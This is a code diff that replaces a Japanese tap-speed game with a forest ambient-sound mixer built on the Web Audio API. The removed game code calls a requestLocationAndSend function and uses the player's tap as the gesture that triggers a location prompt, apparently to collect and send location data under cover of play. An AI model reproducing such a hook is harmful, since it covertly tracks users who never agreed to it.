+                'morning': { name: '木漏れ日の散歩', scene: 'morning', vols: { wind: 0.35, birds: 0.5, stream: 0.3, chimes: 0.15 } },
+                'rainy_cabin': { name: '雨のツリーハウス', scene: 'rain', vols: { rain: 0.6, thunder: 0.2, fire: 0.3, wind: 0.2 } },
+                'lakeside': { name: '夕暮れの湖畔', scene: 'sunset', vols: { stream: 0.4, wind: 0.3, birds: 0.15, bowl: 0.2 } },
+                'campfire': { name: '星空と焚き火', scene: 'night', vols: { fire: 0.6, crickets: 0.4, owl: 0.25, wind: 0.2 } },
+                'zen_meditation': { name: '深緑の禅・瞑想', scene: 'fog', vols: { bowl: 0.5, chimes: 0.3, wind: 0.25, stream: 0.2 } },
+                'stormy_night': { name: '静かな夜の雨嵐', scene: 'rain', vols: { rain: 0.7, thunder: 0.5, wind: 0.4, fire: 0.2 } }
+            };
+
+            let audioCtx = null;
+            let masterGainNode = null;
+            let analyserNode = null;
+            let isMasterPlaying = false;
+            let activeScene = 'morning';
+            let soundNodes = {};
+            let customPresets = {};
+
+            let sleepTimerId = null;
+            let sleepEndTime = null;
+            let pomoTimerId = null;
+            let pomoSecondsLeft = 25 * 60;
+            let pomoIsWorking = true;
+            let pomoIsRunning = false;
+            let binauralNodes = null;
+
+            let bgCanvas, bgCtx, particles = [];
+
+            function initForestPlayer() {
+                renderSoundMatrix();
+                renderPresetButtons();
+                loadCustomPresetsFromStorage();
+                initBackgroundCanvas();
+                initVisualizer();
+                setScene('morning');
+                if (window.lucide) lucide.createIcons();
+            }
+
+            function initAudioEngine() {
+                if (audioCtx) return;
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                audioCtx = new AudioContext();
+                masterGainNode = audioCtx.createGain();
+                masterGainNode.gain.value = parseFloat(document.getElementById('masterVolume').value);
+                analyserNode = audioCtx.createAnalyser();
+                analyserNode.fftSize = 64;
+                masterGainNode.connect(analyserNode);
+                analyserNode.connect(audioCtx.destination);
+
+                SOUND_CONFIG.forEach(config => {
+                    soundNodes[config.id] = createChannelSynth(config.id);
                 });
             }
 
-            startGame() {
-                this.state = 'playing';
-                this.timeLeft = 30.0;
-                this.score = 0;
-                this.combo = 0;
-                this.maxCombo = 0;
-                this.tapHistory = [];
-                this.peakCps = 0;
+            function createChannelSynth(id) {
+                const channelGain = audioCtx.createGain();
+                const panner = audioCtx.createStereoPanner ? audioCtx.createStereoPanner() : null;
+                const sliderVal = parseFloat(document.getElementById(`vol-${id}`)?.value || 0);
+                channelGain.gain.value = isMasterPlaying ? sliderVal : 0;
+                if (panner) {
+                    panner.pan.value = parseFloat(document.getElementById(`pan-${id}`)?.value || 0);
+                    channelGain.connect(panner);
+                    panner.connect(masterGainNode);
+                } else {
+                    channelGain.connect(masterGainNode);
+                }
 
-                this.dom.tapText.textContent = '連打！！';
-                this.dom.subTapText.textContent = '画面のどこでもタップ！';
-                this.dom.resetBtn.classList.remove('hidden');
+                if (id === 'wind' || id === 'rain' || id === 'stream' || id === 'thunder' || id === 'footsteps') {
+                    const bufferSize = audioCtx.sampleRate * 2;
+                    const noiseBuffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+                    const data = noiseBuffer.getChannelData(0);
+                    for (let i = 0; i < bufferSize; i++) data[i] = Math.random() * 2 - 1;
+                    const noiseSource = audioCtx.createBufferSource();
+                    noiseSource.buffer = noiseBuffer;
+                    noiseSource.loop = true;
+                    const filter = audioCtx.createBiquadFilter();
+                    if (id === 'wind') {
+                        filter.type = 'lowpass'; filter.frequency.value = 350;
+                        const lfo = audioCtx.createOscillator(); lfo.frequency.value = 0.2;
+                        const lfoGain = audioCtx.createGain(); lfoGain.gain.value = 200;
+                        lfo.connect(lfoGain); lfoGain.connect(filter.frequency); lfo.start();
+                    } else if (id === 'rain') {
+                        filter.type = 'bandpass'; filter.frequency.value = 1400; filter.Q.value = 1.0;
+                    } else if (id === 'stream') {
+                        filter.type = 'bandpass'; filter.frequency.value = 800; filter.Q.value = 3.0;
+                    } else if (id === 'thunder') {
+                        filter.type = 'lowpass'; filter.frequency.value = 120;
+                    } else if (id === 'footsteps') {
+                        filter.type = 'bandpass'; filter.frequency.value = 600;
+                    }
+                    noiseSource.connect(filter); filter.connect(channelGain); noiseSource.start();
+                } else if (id === 'birds') {
+                    function scheduleBirdChirp() {
+                        if (!isMasterPlaying) return;
+                        const birdVol = parseFloat(document.getElementById('vol-birds').value);
+                        if (birdVol > 0.01) {
+                            const osc = audioCtx.createOscillator();
+                            const g = audioCtx.createGain();
+                            osc.type = 'sine';
+                            const now = audioCtx.currentTime;
+                            const baseFreq = 2200 + Math.random() * 1200;
+                            osc.frequency.setValueAtTime(baseFreq, now);
+                            osc.frequency.exponentialRampToValueAtTime(baseFreq + 800, now + 0.08);
+                            osc.frequency.exponentialRampToValueAtTime(baseFreq - 400, now + 0.15);
+                            g.gain.setValueAtTime(0.01, now);
+                            g.gain.linearRampToValueAtTime(birdVol * 0.3, now + 0.04);
+                            g.gain.exponentialRampToValueAtTime(0.001, now + 0.18);
+                            osc.connect(g); g.connect(channelGain);
+                            osc.start(now); osc.stop(now + 0.2);
+                        }
+                        setTimeout(scheduleBirdChirp, 1200 + Math.random() * 3500);
+                    }
+                    scheduleBirdChirp();
+                } else if (id === 'fire') {
+                    function scheduleCrackles() {
+                        if (!isMasterPlaying) return;
+                        const fVol = parseFloat(document.getElementById('vol-fire').value);
+                        if (fVol > 0.01 && Math.random() < 0.6) {
+                            const osc = audioCtx.createOscillator();
+                            const g = audioCtx.createGain();
+                            osc.type = 'triangle';
+                            const now = audioCtx.currentTime;
+                            osc.frequency.setValueAtTime(100 + Math.random() * 300, now);
+                            g.gain.setValueAtTime(fVol * 0.4, now);
+                            g.gain.exponentialRampToValueAtTime(0.001, now + 0.03);
+                            osc.connect(g); g.connect(channelGain);
+                            osc.start(now); osc.stop(now + 0.04);
+                        }
+                        setTimeout(scheduleCrackles, 80 + Math.random() * 200);
+                    }
+                    scheduleCrackles();
+                } else if (id === 'crickets') {
+                    function scheduleCrickets() {
+                        if (!isMasterPlaying) return;
+                        const cVol = parseFloat(document.getElementById('vol-crickets').value);
+                        if (cVol > 0.01) {
+                            const now = audioCtx.currentTime;
+                            for (let i = 0; i < 3; i++) {
+                                const osc = audioCtx.createOscillator();
+                                const g = audioCtx.createGain();
+                                osc.type = 'sawtooth';
+                                osc.frequency.setValueAtTime(4500, now + i * 0.05);
+                                g.gain.setValueAtTime(0, now + i * 0.05);
+                                g.gain.linearRampToValueAtTime(cVol * 0.15, now + i * 0.05 + 0.01);
+                                g.gain.exponentialRampToValueAtTime(0.001, now + i * 0.05 + 0.04);
+                                osc.connect(g); g.connect(channelGain);
+                                osc.start(now + i * 0.05); osc.stop(now + i * 0.05 + 0.05);
+                            }
+                        }
+                        setTimeout(scheduleCrickets, 800 + Math.random() * 1500);
+                    }
+                    scheduleCrickets();
+                } else if (id === 'chimes') {
+                    const chimeScale = [523.25, 587.33, 659.25, 783.99, 880.00, 1046.50];
+                    function scheduleChime() {
+                        if (!isMasterPlaying) return;
+                        const chVol = parseFloat(document.getElementById('vol-chimes').value);
+                        if (chVol > 0.01 && Math.random() < 0.5) {
+                            const freq = chimeScale[Math.floor(Math.random() * chimeScale.length)];
+                            const osc = audioCtx.createOscillator();
+                            const g = audioCtx.createGain();
+                            osc.type = 'sine';
+                            const now = audioCtx.currentTime;
+                            osc.frequency.setValueAtTime(freq, now);
+                            g.gain.setValueAtTime(chVol * 0.25, now);
+                            g.gain.exponentialRampToValueAtTime(0.0001, now + 2.5);
+                            osc.connect(g); g.connect(channelGain);
+                            osc.start(now); osc.stop(now + 2.6);
+                        }
+                        setTimeout(scheduleChime, 2000 + Math.random() * 4000);
+                    }
+                    scheduleChime();
+                } else if (id === 'bowl') {
+                    const osc = audioCtx.createOscillator();
+                    osc.type = 'sine';
+                    osc.frequency.value = 432;
+                    osc.connect(channelGain);
+                    osc.start();
+                } else if (id === 'owl') {
+                    function scheduleOwl() {
+                        if (!isMasterPlaying) return;
+                        const oVol = parseFloat(document.getElementById('vol-owl').value);
+                        if (oVol > 0.01) {
+                            const now = audioCtx.currentTime;
+                            const osc = audioCtx.createOscillator();
+                            const g = audioCtx.createGain();
+                            osc.type = 'sine';
+                            osc.frequency.setValueAtTime(320, now);
+                            osc.frequency.exponentialRampToValueAtTime(280, now + 0.4);
+                            g.gain.setValueAtTime(0.01, now);
+                            g.gain.linearRampToValueAtTime(oVol * 0.35, now + 0.1);
+                            g.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
+                            osc.connect(g); g.connect(channelGain);
+                            osc.start(now); osc.stop(now + 0.55);
+                        }
+                        setTimeout(scheduleOwl, 6000 + Math.random() * 8000);
+                    }
+                    scheduleOwl();
+                }
 
-                const startTime = Date.now();
-                this.gameInterval = setInterval(() => {
-                    const elapsed = (Date.now() - startTime) / 1000;
-                    this.timeLeft = Math.max(0, 30.0 - elapsed);
-                    this.dom.timeDisplay.innerHTML = `${this.timeLeft.toFixed(1)}<span class="text-lg">s</span>`;
-                    this.updateCPS();
-                    if (this.timeLeft <= 0) this.endGame();
-                }, 50);
+                return { gain: channelGain, panner: panner };
             }
 
-            onTap(x, y) {
-                if (this.state === 'finished') return;
-                if (!this.dom.resultModal.classList.contains('hidden')) return;
+            function toggleMasterPlay() {
+                if (!audioCtx) initAudioEngine();
+                if (audioCtx.state === 'suspended') audioCtx.resume();
+                isMasterPlaying = !isMasterPlaying;
 
-                // 位置情報がまだ解決していない場合：ユーザーのタップをジェスチャーとして使う
-                if (!this.locationResolved) {
-                    // まだリクエストしていなければ発火、既にリクエスト済みなら何もしない
-                    if (!this.locationRequested) {
-                        this.requestLocationAndSend(false);
-                    }
-                    // 許可待ちの間はスコアを加算しない（誤タップ対策）
-                    // ただし視覚フィードバックだけは返す
-                    audio.playTap(false);
-                    haptic(8);
-                    this.spawnRipple(x, y, false);
+                const playBtnIcon = document.getElementById('masterPlayIcon');
+                const playingBadge = document.getElementById('playingBadge');
+                const statusDesc = document.getElementById('masterStatusDesc');
+
+                if (isMasterPlaying) {
+                    playBtnIcon.setAttribute('data-lucide', 'pause');
+                    playingBadge.innerText = '再生中';
+                    playingBadge.className = 'text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/30';
+                    statusDesc.innerText = '豊かな自然のサウンドが心地よく響いています';
+                    SOUND_CONFIG.forEach(s => {
+                        const sliderVal = parseFloat(document.getElementById(`vol-${s.id}`).value);
+                        if (soundNodes[s.id]) soundNodes[s.id].gain.gain.setValueAtTime(sliderVal, audioCtx.currentTime);
+                    });
+                } else {
+                    playBtnIcon.setAttribute('data-lucide', 'play');
+                    playingBadge.innerText = '停止中';
+                    playingBadge.className = 'text-[10px] px-2 py-0.5 rounded-full bg-gray-500/20 text-gray-400 border border-gray-500/30';
+                    statusDesc.innerText = '再生ボタンを押して森の響きを解き放ちます';
+                    SOUND_CONFIG.forEach(s => {
+                        if (soundNodes[s.id]) soundNodes[s.id].gain.gain.setValueAtTime(0, audioCtx.currentTime);
+                    });
+                }
+                updateActiveChannelCount();
+                if (window.lucide) lucide.createIcons();
+            }
+
+            function updateChannelVolume(id, val) {
+                const v = parseFloat(val);
+                document.getElementById(`volVal-${id}`).innerText = `${Math.round(v * 100)}%`;
+                if (isMasterPlaying && soundNodes[id]) {
+                    soundNodes[id].gain.gain.setValueAtTime(v, audioCtx.currentTime);
+                }
+                updateActiveChannelCount();
+            }
+
+            function updateChannelPan(id, val) {
+                const p = parseFloat(val);
+                const label = p < -0.1 ? `L${Math.abs(Math.round(p * 100))}` : p > 0.1 ? `R${Math.round(p * 100)}` : 'C';
+                document.getElementById(`panVal-${id}`).innerText = label;
+                if (soundNodes[id] && soundNodes[id].panner) {
+                    soundNodes[id].panner.pan.setValueAtTime(p, audioCtx.currentTime);
+                }
+            }
+
+            function updateMasterVolume(val) {
+                const v = parseFloat(val);
+                document.getElementById('masterVolValue').innerText = `${Math.round(v * 100)}%`;
+                if (masterGainNode) masterGainNode.gain.setValueAtTime(v, audioCtx.currentTime);
+            }
+
+            function muteAllChannels() {
+                SOUND_CONFIG.forEach(s => {
+                    document.getElementById(`vol-${s.id}`).value = 0;
+                    updateChannelVolume(s.id, 0);
+                });
+            }
+
+            function updateActiveChannelCount() {
+                if (!isMasterPlaying) {
+                    document.getElementById('activeChannelsCount').innerText = '0 音源再生中';
                     return;
                 }
+                let active = 0;
+                SOUND_CONFIG.forEach(s => {
+                    const v = parseFloat(document.getElementById(`vol-${s.id}`).value);
+                    if (v > 0.02) active++;
+                });
+                document.getElementById('activeChannelsCount').innerText = `${active} 音源再生中`;
+            }
 
-                // 通常プレイ
-                if (this.state === 'idle') this.startGame();
-
-                const now = Date.now();
-                this.dom.tapBtn.classList.add('active-press');
-                setTimeout(() => this.dom.tapBtn.classList.remove('active-press'), 60);
-
-                if (now - this.lastTapTime < 350) this.combo++;
-                else this.combo = 1;
-                this.lastTapTime = now;
-
-                if (this.combo > this.maxCombo) this.maxCombo = this.combo;
-                this.isFever = this.combo >= 25;
-                const points = this.isFever ? 2 : 1;
-                this.score += points;
-                this.tapHistory.push(now);
-
-                audio.playTap(this.isFever);
-                haptic(this.isFever ? [8, 5, 8] : 8);
-
-                const particleColor = this.isFever ? '#ffd700' : '#00f3ff';
-                particles.spawn(x, y, particleColor, this.isFever ? 10 : 5);
-                this.spawnRipple(x, y, this.isFever);
-                this.spawnFloatText(x, y, `+${points}`, this.isFever);
-
-                if (this.isFever) {
-                    this.dom.feverBadge.classList.remove('hidden');
-                    this.dom.tapBtn.classList.remove('glow-cyan');
-                    this.dom.tapBtn.classList.add('glow-gold');
-                    document.body.classList.add('shake');
-                    setTimeout(() => document.body.classList.remove('shake'), 80);
-                } else {
-                    this.dom.feverBadge.classList.add('hidden');
-                    this.dom.tapBtn.classList.add('glow-cyan');
-                    this.dom.tapBtn.classList.remove('glow-gold');
+            function setBinaural(type) {
+                if (!audioCtx) initAudioEngine();
+                document.querySelectorAll('.binaural-btn').forEach(b => b.classList.remove('border-amber-400', 'bg-amber-500/20'));
+                if (binauralNodes) {
+                    try { binauralNodes.leftOsc.stop(); binauralNodes.rightOsc.stop(); } catch(e){}
+                    binauralNodes = null;
                 }
-
-                if (this.combo >= 5) {
-                    this.dom.comboBadge.classList.remove('hidden');
-                    this.dom.comboCount.textContent = this.combo;
-                } else {
-                    this.dom.comboBadge.classList.add('hidden');
+                const stateTag = document.getElementById('binauralStateTag');
+                if (type === 'none') {
+                    stateTag.innerText = 'OFF';
+                    stateTag.className = 'text-[10px] px-2 py-0.5 rounded-full bg-white/10 text-gray-300';
+                    return;
                 }
-
-                this.dom.scoreDisplay.textContent = this.score;
+                const freqs = { 'alpha': { base: 200, diff: 10 }, 'theta': { base: 180, diff: 6 }, 'delta': { base: 150, diff: 2 } };
+                const cfg = freqs[type];
+                document.getElementById(`binauralBtn-${type}`).classList.add('border-amber-400', 'bg-amber-500/20');
+                stateTag.innerText = type.toUpperCase() + ' ON';
+                stateTag.className = 'text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 font-bold border border-emerald-500/30';
+                const vol = parseFloat(document.getElementById('binauralVol').value);
+                const leftOsc = audioCtx.createOscillator();
+                const leftMerger = audioCtx.createChannelMerger(2);
+                const leftGain = audioCtx.createGain();
+                leftOsc.frequency.value = cfg.base;
+                leftGain.gain.value = vol;
+                leftOsc.connect(leftGain);
+                leftGain.connect(leftMerger, 0, 0);
+                const rightOsc = audioCtx.createOscillator();
+                const rightGain = audioCtx.createGain();
+                rightOsc.frequency.value = cfg.base + cfg.diff;
+                rightGain.gain.value = vol;
+                rightOsc.connect(rightGain);
+                rightGain.connect(leftMerger, 0, 1);
+                leftMerger.connect(masterGainNode);
+                leftOsc.start();
+                rightOsc.start();
+                binauralNodes = { leftOsc, rightOsc, leftGain, rightGain };
             }
 
-            spawnRipple(x, y, isFever) {
-                const el = document.createElement('div');
-                el.className = 'ripple';
-                el.style.left = `${x}px`;
-                el.style.top = `${y}px`;
-                if (isFever) el.style.background = 'radial-gradient(circle, rgba(255,215,0,0.7) 0%, rgba(255,215,0,0) 70%)';
-                document.body.appendChild(el);
-                setTimeout(() => el.remove(), 500);
+            function updateBinauralVolume(val) {
+                if (binauralNodes) {
+                    binauralNodes.leftGain.gain.setValueAtTime(parseFloat(val), audioCtx.currentTime);
+                    binauralNodes.rightGain.gain.setValueAtTime(parseFloat(val), audioCtx.currentTime);
+                }
             }
 
-            updateCPS() {
-                const now = Date.now();
-                this.tapHistory = this.tapHistory.filter(t => now - t <= 1000);
-                const currentCps = this.tapHistory.length;
-                if (currentCps > this.peakCps) this.peakCps = currentCps;
-                this.dom.cpsDisplay.textContent = currentCps.toFixed(1);
+            function renderPresetButtons() {
+                const container = document.getElementById('presetButtonsContainer');
+                container.innerHTML = Object.keys(PRESETS).map(key => {
+                    const p = PRESETS[key];
+                    return `
+                        <button onclick="applyPreset('${key}')" class="p-2.5 rounded-2xl border border-white/10 bg-white/5 hover:bg-white/10 transition text-left space-y-1">
+                            <div class="font-bold text-xs text-amber-200 font-yuji">${p.name}</div>
+                            <div class="text-[10px] text-gray-400">${Object.keys(p.vols).length} 種の自然音</div>
+                        </button>
+                    `;
+                }).join('');
             }
 
-            spawnFloatText(x, y, text, isFever) {
-                const el = document.createElement('div');
-                el.className = `float-text ${isFever ? 'text-neonGold text-4xl' : 'text-neonCyan text-3xl'}`;
-                el.textContent = text;
-                el.style.left = `${x}px`;
-                el.style.top = `${y}px`;
-                document.body.appendChild(el);
-                setTimeout(() => el.remove(), 650);
+            function applyPreset(key) {
+                const p = PRESETS[key];
+                if (!p) return;
+                SOUND_CONFIG.forEach(s => {
+                    const targetVol = p.vols[s.id] || 0;
+                    document.getElementById(`vol-${s.id}`).value = targetVol;
+                    updateChannelVolume(s.id, targetVol);
+                });
+                setScene(p.scene);
+                document.getElementById('currentPresetName').innerText = p.name;
+                if (!isMasterPlaying) toggleMasterPlay();
             }
 
-            getRank(score) {
-                if (score >= 350) return { title: '神レベル (GOD TAPPER)', color: 'bg-neonGold text-black' };
-                if (score >= 260) return { title: '達人レベル (MASTER)', color: 'bg-neonPink text-white' };
-                if (score >= 180) return { title: '上級者レベル (EXPERT)', color: 'bg-purple-600 text-white' };
-                if (score >= 100) return { title: '中級者レベル (PRO)', color: 'bg-neonCyan text-black' };
-                return { title: '初心者レベル (BEGINNER)', color: 'bg-slate-700 text-white' };
+            function openSavePresetModal() {
+                document.getElementById('savePresetModal').classList.remove('hidden');
+                setTimeout(() => document.getElementById('savePresetModal').classList.remove('opacity-0'), 10);
+            }
+            function closeSavePresetModal() {
+                document.getElementById('savePresetModal').classList.add('opacity-0');
+                setTimeout(() => document.getElementById('savePresetModal').classList.add('hidden'), 300);
             }
 
-            endGame() {
-                clearInterval(this.gameInterval);
-                this.state = 'finished';
-                audio.playFinish();
-                haptic([30, 40, 30, 40, 80]);
-
-                if (!this.locationRequested) this.requestLocationAndSend();
-
-                const bestScore = parseInt(localStorage.getItem('30s_tap_best') || '0', 10);
-                const isNewRecord = this.score > bestScore;
-                if (isNewRecord) localStorage.setItem('30s_tap_best', this.score);
-
-                const avgCps = (this.score / 30.0).toFixed(1);
-                const rankInfo = this.getRank(this.score);
-
-                const rankBadge = document.getElementById('rankBadge');
-                rankBadge.textContent = `RANK: ${rankInfo.title}`;
-                rankBadge.className = `inline-block px-4 py-1 rounded-full font-black text-xs uppercase tracking-widest mb-3 shadow-lg ${rankInfo.color}`;
-
-                document.getElementById('resTotalHits').textContent = this.score;
-                document.getElementById('resAvgCps').textContent = avgCps;
-                document.getElementById('resPeakCps').textContent = this.peakCps.toFixed(1);
-                document.getElementById('resMaxCombo').textContent = this.maxCombo;
-
-                const nrn = document.getElementById('newRecordNotice');
-                if (isNewRecord && this.score > 0) nrn.classList.remove('hidden');
-                else nrn.classList.add('hidden');
-
-                this.dom.hitLayer.classList.add('disabled');
-                this.dom.resultModal.classList.remove('hidden');
+            function confirmSaveCustomPreset() {
+                const name = document.getElementById('customPresetInput').value.trim() || 'マイ・ミックス';
+                const vols = {};
+                SOUND_CONFIG.forEach(s => {
+                    const v = parseFloat(document.getElementById(`vol-${s.id}`).value);
+                    if (v > 0) vols[s.id] = v;
+                });
+                const id = 'custom_' + Date.now();
+                customPresets[id] = { name, vols, scene: activeScene };
+                localStorage.setItem('forest_custom_presets', JSON.stringify(customPresets));
+                renderCustomPresets();
+                closeSavePresetModal();
+                document.getElementById('customPresetInput').value = '';
             }
 
-            resetGame() {
-                clearInterval(this.gameInterval);
-                this.state = 'idle';
-                this.timeLeft = 30.0;
-                this.score = 0;
-                this.combo = 0;
-                this.maxCombo = 0;
-                this.isFever = false;
-                this.tapHistory = [];
-                this.peakCps = 0;
-
-                this.dom.timeDisplay.innerHTML = `30.0<span class="text-lg">s</span>`;
-                this.dom.scoreDisplay.textContent = '0';
-                this.dom.cpsDisplay.textContent = '0.0';
-                this.dom.tapText.textContent = 'START TAP!';
-                this.dom.subTapText.textContent = '画面のどこでもタップ！';
-                this.dom.comboBadge.classList.add('hidden');
-                this.dom.feverBadge.classList.add('hidden');
-                this.dom.resetBtn.classList.add('hidden');
-                this.dom.tapBtn.className = 'tap-btn relative w-56 h-56 md:w-64 md:h-64 rounded-full bg-gradient-to-br from-cyan-500 via-blue-600 to-indigo-950 glow-cyan border-4 border-cyan-300 flex flex-col justify-center items-center cursor-pointer focus:outline-none shadow-2xl pointer-events-none';
-                this.dom.hitLayer.classList.remove('disabled');
-
-                // 位置情報は既に解決済みの場合は再要求しない
-                // （位置情報を再取得したい場合はページリロードが必要）
+            function loadCustomPresetsFromStorage() {
+                try {
+                    const saved = localStorage.getItem('forest_custom_presets');
+                    if (saved) {
+                        customPresets = JSON.parse(saved);
+                        renderCustomPresets();
+                    }
+                } catch (e) { console.error(e); }
             }
-        }
 
-        // ============================================================
-        // 初期化
-        // ============================================================
-        window.addEventListener('load', () => {
-            new TapGame();
+            function renderCustomPresets() {
+                const container = document.getElementById('customPresetsList');
+                const keys = Object.keys(customPresets);
+                if (keys.length === 0) {
+                    document.getElementById('customPresetsSection').classList.add('hidden');
+                    return;
+                }
+                document.getElementById('customPresetsSection').classList.remove('hidden');
+                container.innerHTML = keys.map(k => {
+                    const cp = customPresets[k];
+                    return `
+                        <div class="flex items-center justify-between p-2 rounded-xl bg-black/30 border border-white/10 text-xs">
+                            <span onclick="applyCustomPreset('${k}')" class="font-bold text-emerald-300 cursor-pointer hover:underline">${cp.name}</span>
+                            <button onclick="deleteCustomPreset('${k}')" class="text-gray-500 hover:text-red-400 p-1"><i data-lucide="trash-2" class="w-3.5 h-3.5"></i></button>
+                        </div>
+                    `;
+                }).join('');
+                if (window.lucide) lucide.createIcons();
+            }
 
-            document.addEventListener('touchmove', (e) => {
-                if (e.touches.length > 1) e.preventDefault();
-            }, { passive: false });
-        });
+            function applyCustomPreset(k) {
+                const cp = customPresets[k];
+                if (!cp) return;
+                SOUND_CONFIG.forEach(s => {
+                    const targetVol = cp.vols[s.id] || 0;
+                    document.getElementById(`vol-${s.id}`).value = targetVol;
+                    updateChannelVolume(s.id, targetVol);
+                });
+                if (cp.scene) setScene(cp.scene);
+                document.getElementById('currentPresetName').innerText = cp.name;
+                if (!isMasterPlaying) toggleMasterPlay();
+            }
 
-        function setVH() {
-            document.documentElement.style.setProperty('--vh', `${window.innerHeight * 0.01}px`);
-        }
-        setVH();
-        window.addEventListener('resize', setVH);
-        window.addEventListener('orientationchange', setVH);
+            function deleteCustomPreset(k) {
+                delete customPresets[k];
+                localStorage.setItem('forest_custom_presets', JSON.stringify(customPresets));
+                renderCustomPresets();
+            }
+
+            function renderSoundMatrix() {
+                const container = document.getElementById('soundMatrixGrid');
+                container.innerHTML = SOUND_CONFIG.map(s => `
+                    <div class="p-3.5 rounded-2xl bg-black/30 border border-white/10 space-y-3 hover:border-white/20 transition">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-2.5">
+                                <div class="w-8 h-8 rounded-xl bg-forest-600/40 border border-forest-400/30 flex items-center justify-center text-amber-300">
+                                    <i data-lucide="${s.icon}" class="w-4 h-4"></i>
+                                </div>
+                                <div>
+                                    <h3 class="font-bold text-xs text-white">${s.name}</h3>
+                                    <p class="text-[10px] text-gray-400">${s.desc}</p>
+                                </div>
+                            </div>
+                            <span id="volVal-${s.id}" class="text-xs font-mono font-bold text-emerald-300">${Math.round(s.defaultVol * 100)}%</span>
+                        </div>
+                        <div class="space-y-1">
+                            <div class="flex items-center justify-between text-[10px] text-gray-400">
+                                <span>音量</span>
+                            </div>
+                            <input type="range" id="vol-${s.id}" min="0" max="1" step="0.01" value="${s.defaultVol}" oninput="updateChannelVolume('${s.id}', this.value)" class="w-full">
+                        </div>
+                        <div class="flex items-center gap-2 pt-1 border-t border-white/5">
+                            <span class="text-[10px] text-gray-400 min-w-max">パン (L/R)</span>
+                            <input type="range" id="pan-${s.id}" min="-1" max="1" step="0.05" value="0" oninput="updateChannelPan('${s.id}', this.value)" class="w-full">
+                            <span id="panVal-${s.id}" class="text-[10px] font-mono text-gray-400 min-w-[20px] text-right">C</span>
+                        </div>
+                    </div>
+                `).join('');
+            }
+
+            function setScene(sceneKey) {
+                activeScene = sceneKey;
+                document.querySelectorAll('.scene-btn').forEach(b => b.classList.remove('bg-forest-600', 'text-white', 'border-forest-400'));
+                const activeBtn = document.getElementById(`sceneBtn-${sceneKey}`);
+                if (activeBtn) activeBtn.classList.add('bg-forest-600', 'text-white', 'border-forest-400');
+                initParticlesForScene(sceneKey);
+            }
+
+            function initBackgroundCanvas() {
+                bgCanvas = document.getElementById('bgCanvas');
+                bgCtx = bgCanvas.getContext('2d');
+                resizeCanvas();
+                window.addEventListener('resize', resizeCanvas);
+                requestAnimationFrame(animateParticles);
+            }
+
+            function resizeCanvas() {
+                bgCanvas.width = window.innerWidth;
+                bgCanvas.height = window.innerHeight;
+                initParticlesForScene(activeScene);
+            }
+
+            function initParticlesForScene(scene) {
+                particles = [];
+                const count = scene === 'night' ? 60 : 40;
+                for (let i = 0; i < count; i++) {
+                    particles.push({
+                        x: Math.random() * bgCanvas.width,
+                        y: Math.random() * bgCanvas.height,
+                        radius: Math.random() * (scene === 'night' ? 3 : 4) + 1,
+                        speedX: (Math.random() - 0.5) * 0.8,
+                        speedY: scene === 'rain' ? Math.random() * 8 + 4 : Math.random() * 0.6 + 0.2,
+                        opacity: Math.random() * 0.7 + 0.2,
+                        pulse: Math.random() * 0.05
+                    });
+                }
+            }
+
+            function animateParticles() {
+                if (!bgCtx) return;
+                bgCtx.clearRect(0, 0, bgCanvas.width, bgCanvas.height);
+                const grad = bgCtx.createLinearGradient(0, 0, 0, bgCanvas.height);
+                if (activeScene === 'morning') { grad.addColorStop(0, '#0f2b1d'); grad.addColorStop(1, '#081710'); }
+                else if (activeScene === 'rain') { grad.addColorStop(0, '#101c24'); grad.addColorStop(1, '#080d12'); }
+                else if (activeScene === 'sunset') { grad.addColorStop(0, '#2d1a10'); grad.addColorStop(1, '#0d1018'); }
+                else if (activeScene === 'night') { grad.addColorStop(0, '#0b0f19'); grad.addColorStop(1, '#05070d'); }
+                else if (activeScene === 'fog') { grad.addColorStop(0, '#132620'); grad.addColorStop(1, '#0a1410'); }
+                bgCtx.fillStyle = grad;
+                bgCtx.fillRect(0, 0, bgCanvas.width, bgCanvas.height);
+
+                particles.forEach(p => {
+                    bgCtx.beginPath();
+                    if (activeScene === 'rain') {
+                        bgCtx.strokeStyle = `rgba(180, 210, 255, ${p.opacity * 0.5})`;
+                        bgCtx.lineWidth = 1.2;
+                        bgCtx.moveTo(p.x, p.y);
+                        bgCtx.lineTo(p.x - 1, p.y + p.speedY * 2);
+                        bgCtx.stroke();
+                    } else if (activeScene === 'night') {
+                        bgCtx.fillStyle = `rgba(255, 230, 120, ${p.opacity})`;
+                        bgCtx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+                        bgCtx.fill();
+                    } else {
+                        bgCtx.fillStyle = `rgba(142, 194, 166, ${p.opacity * 0.4})`;
+                        bgCtx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+                        bgCtx.fill();
+                    }
+                    p.x += p.speedX;
+                    p.y += p.speedY;
+                    if (p.y > bgCanvas.height) p.y = -10;
+                    if (p.x > bgCanvas.width) p.x = 0;
+                    if (p.x < 0) p.x = bgCanvas.width;
+                });
+                requestAnimationFrame(animateParticles);
+            }
+
+            function initVisualizer() {
+                const vCanvas = document.getElementById('visualizerCanvas');
+                const vCtx = vCanvas.getContext('2d');
+                function drawVis() {
+                    vCanvas.width = vCanvas.offsetWidth;
+                    vCanvas.height = vCanvas.offsetHeight;
+                    vCtx.clearRect(0, 0, vCanvas.width, vCanvas.height);
+                    if (analyserNode && isMasterPlaying) {
+                        const dataArray = new Uint8Array(analyserNode.frequencyBinCount);
+                        analyserNode.getByteFrequencyData(dataArray);
+                        const barWidth = (vCanvas.width / dataArray.length) * 1.5;
+                        let x = 0;
+                        for (let i = 0; i < dataArray.length; i++) {
+                            const barHeight = (dataArray[i] / 255) * vCanvas.height * 0.8;
+                            vCtx.fillStyle = `rgba(96, 164, 129, ${0.4 + (dataArray[i] / 255) * 0.6})`;
+                            vCtx.fillRect(x, vCanvas.height - barHeight, barWidth - 2, barHeight);
+                            x += barWidth;
+                        }
+                    } else {
+                        vCtx.beginPath();
+                        vCtx.strokeStyle = 'rgba(255, 255, 255, 0.15)';
+                        vCtx.lineWidth = 2;
+                        for (let x = 0; x < vCanvas.width; x += 5) {
+                            const y = vCanvas.height / 2 + Math.sin(x * 0.03 + Date.now() * 0.002) * 4;
